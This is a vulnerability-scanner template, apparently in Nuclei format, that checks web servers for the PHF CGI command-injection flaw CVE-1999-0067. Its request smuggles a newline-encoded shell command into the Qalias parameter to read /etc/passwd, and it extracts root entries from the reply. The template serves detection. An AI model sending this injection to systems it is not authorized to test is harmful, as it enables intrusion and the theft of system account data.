id: CVE-1999-0067

info:
  name: PHF CGI Phone Book - Remote Command Execution
  author: geeknik
  severity: critical
  description: |
    The phf CGI program on Apache and NCSA web servers allows remote attackers
    to execute arbitrary commands via newline characters in the Qalias parameter.
    The phf script passes unsanitized user input to a shell command, allowing
    injection of arbitrary commands via URL-encoded newline (%0a) sequences.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-1999-0067
    - https://www.cisa.gov/known-exploited-vulnerabilities-catalog
  classification:
    cve-id: CVE-1999-0067
    cwe-id: CWE-78
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 10.0
  tags: cve,cve1999,cgi,rce,phf

http:
  - method: GET
    path:
      - "{{BaseURL}}/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

    extractors:
      - type: regex
        part: body
        name: passwd_entry
        regex:
          - "root:.*:0:0:[^:]*:[^:]*:[^\\n]*"
